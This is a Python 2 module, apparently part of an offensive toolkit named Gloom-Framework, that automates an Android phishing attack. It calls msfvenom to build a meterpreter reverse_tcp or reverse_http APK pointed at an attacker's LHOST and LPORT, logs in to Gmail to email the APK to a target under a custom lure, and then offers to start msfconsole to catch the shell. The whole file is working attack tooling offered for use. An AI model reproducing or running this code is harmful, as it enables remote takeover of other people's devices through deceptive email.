"""
This module will let us Create an android payload
and send it off to a target. When opened, we will
get a meterpreter shell on that android device.


"""

import os
import sys
import time
import smtplib
import subprocess
from getpass import getpass
from termcolor import colored, cprint
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.MIMEBase import MIMEBase

class SMS(object):

    def __init__(self): ### Collecting Important Input Variables
        os.system('clear')
        self.CORE_STRING = colored("[android_attack]", 'blue')
        self.INFO_STRING = colored("[android_attack]", 'green')
        self.ERROR_STRING = colored("[android_attack_error]", 'red')
        self.smtp = smtplib.SMTP("smtp.gmail.com", 587)

        self.TARGET = raw_input(self.CORE_STRING + " Target Email Address: ")
        self.GMAIL = raw_input(self.CORE_STRING + " Your Gmail Address: ")
        self.PASSWORD = getpass(self.CORE_STRING + " Password: ")
        self.PAYLOAD_NAME = raw_input(self.CORE_STRING + " Payload Name: ")
        self.PAYLOAD_TYPE = raw_input(self.CORE_STRING + " [1] reverse_tcp [2] reverse_http: ")
        os.system('clear')
        self.LHOST = raw_input(self.CORE_STRING + " LHOST: ")
        self.LPORT = raw_input(self.CORE_STRING + " LPORT: ")
        os.system('clear')
        self.SUBJECT = raw_input(self.CORE_STRING + " Subject: ")
        self.MAIN_MESSAGE = raw_input(self.CORE_STRING + " Main Email Message(Body): ")

        self.IS_SENT = False
        self.IS_LOGGED_IN = False
        self.CONNECTED_TLS = False
        self.IS_PAYLOAD_GENERATED = False
        self.CALL_METASPLOIT = False
        self.GET_INPUT_VARS = True
        self.RUN_WITHOUT_ERROR_CODE_1_ = False
        self.SMTP_AUTHENTICATION_ERROR = False


    def do_login(self):
        self.smtp.starttls()
        self.CONNECTED_TLS = True

        print self.CORE_STRING + " Attepting Sign In..."
        try:
            self.IS_LOGGED_IN = True
            self.smtp.login(self.GMAIL, self.PASSWORD)
            time.sleep(1)
            print self.INFO_STRING + " Logged In!"
            time.sleep(0.57)
            ## ATTEMPTING SMTP LOGIN

        except smtplib.SMTPAuthenticationError:
            self.SMTP_AUTHENTICATION_ERROR = True
            print self.ERROR_STRING + "SMTP Login Error :: Could Not Validate Credentials."
            return False
            sys.exit(1)

        except:
            pass

    def do_payload(self):
        """
        ANDROID PAYLOAD(TCP) -> android/meterpreter/reverse_tcp
        ANDROID PAYLOAD(HTTP) -> android/meterpreter/reverse_http
        """

        reverse_tcp = ("xterm -e msfvenom -p android/meterpreter/reverse_tcp LHOST="+ self.LHOST +" LPORT="+self.LPORT+
                " -o ~/Gloom-Framework/core/"+self.PAYLOAD_NAME+".apk")

        reverse_http = ("xterm -e msfvenom -p android/meterpreter/reverse_http LHOST="+ self.LHOST +" LPORT="+self.LPORT+
                " -o ~/Gloom-Framework/core/"+self.PAYLOAD_NAME+".apk")

        if self.PAYLOAD_TYPE == '1':
            print self.CORE_STRING + " Generating .apk Payload..."
            print self.CORE_STRING + " Please Wait"
            os.system(reverse_tcp)

        elif self.PAYLOAD_TYPE == '2':
            print self.CORE_STRING + " Generating .apk Payload..."
            print self.CORE_STRING + " Please Wait"
            os.system(reverse_http)

        self.IS_PAYLOAD_GENERATED = True
        print self.INFO_STRING + " Payload Created! Awaiting To Be Sent Off To Target...\n\n"
        time.sleep(0.5)

    def do_sms_mail(self):
        """
        ATTACH PAYLOAD and send Mail
        """
        try:
            from email import Encoders

        except ImportError as gi:
            print self.ERROR_STRING + str(ie)

        except:
            pass

        SUBJECT = self.SUBJECT
        ATTACK_MSG_ = MIMEMultipart()
        ATTACK_MSG_['Subject'] = (self.SUBJECT + '\n' + self.MAIN_MESSAGE)
        ATTACK_MSG_['From'] = self.GMAIL
        ATTACK_MSG_['To'] = ', '.join(self.TARGET)

        extension = '.apk'

        final_load = self.PAYLOAD_NAME + extension

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(str(final_load), "rb").read())
        Encoders.encode_base64(part)

        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                % str(final_load))

        ATTACK_MSG_.attach(part)

        try:
            self.smtp.sendmail(self.GMAIL, self.TARGET, ATTACK_MSG_.as_string())
            print self.INFO_STRING + " Sent Payload Successfully!"
            self.IS_SENT = True

        except:
            print self.ERROR_STRING + " An Unknown Error Occured"
            sys.exit(1)

    def do_metasploit(self):
        time.sleep(1.2)
        msf_input = raw_input(colored("\n{?} Would You Like to Run Metasploit Now [y/n]: ", 'yellow'))
        y_ans = [
                'yes',
                'y',
                'Y',
                'Yes'
        ]

        n_ans = [
                'no',
                'n',
                'N',
                'No'
        ]

        try:

            if msf_input in y_ans and self.PAYLOAD_TYPE == '1':
                msf = "sudo msfconsole"
                ## Execute
                os.system(msf)

            if msf_input in y_ans and self.PAYLOAD_TYPE == '2':

                msf = "sudo msfconsole"
                os.system(msf)

            elif msf_input in n_ans:
                sys.exit(1)

        except KeyboardInterrupt:
            sys.exit(0)

        except:
            pass

